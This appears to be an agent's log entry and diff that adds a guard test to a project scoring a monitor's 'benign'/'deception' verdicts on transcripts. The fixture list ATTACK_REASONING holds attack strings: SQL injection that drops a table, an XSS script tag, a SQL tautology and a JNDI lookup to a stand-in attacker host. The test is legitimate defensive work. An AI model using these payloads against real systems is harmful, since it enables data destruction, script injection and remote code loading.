events.text: Adding a guard test that adversarial `reasoning` strings can't perturb the metrics — `evaluate` should be agnostic to verdict text. 24 green.

events.diff:
+
+ATTACK_REASONING = [
+    "'; DROP TABLE verdicts; --",
+    "<script>alert('xss')</script>",
+    "1' OR '1'='1",
+    "${jndi:ldap://attacker/x}",
+]
+
+
+class TestAdversarialFixtures:
+    # Verdict reasoning is free text from another model; metrics must not depend
+    # on its contents, so attack-shaped strings change nothing in the output.
+    def test_reasoning_content_does_not_affect_scoring(self) -> None:
+        labels = [
+            LabeledTranscript(transcript_id="a", label="benign"),
+            LabeledTranscript(transcript_id="b", label="deception"),
+        ]
+        clean = [_verdict("a", 10), _verdict("b", 90)]
+        tainted = [
+            _verdict("a", 10).model_copy(update={"reasoning": ATTACK_REASONING[0]}),
+            _verdict("b", 90).model_copy(update={"reasoning": ATTACK_REASONING[1]}),
+        ]
+        assert evaluate(clean, labels) == evaluate(tainted, labels)

events.command: env -u UV_PYTHON uv run --no-sync pytest tests/test_metrics.py tests/test_report.py -q && env -u UV_PYTHON uv run --no-sync ruff check tests/test_metrics.py
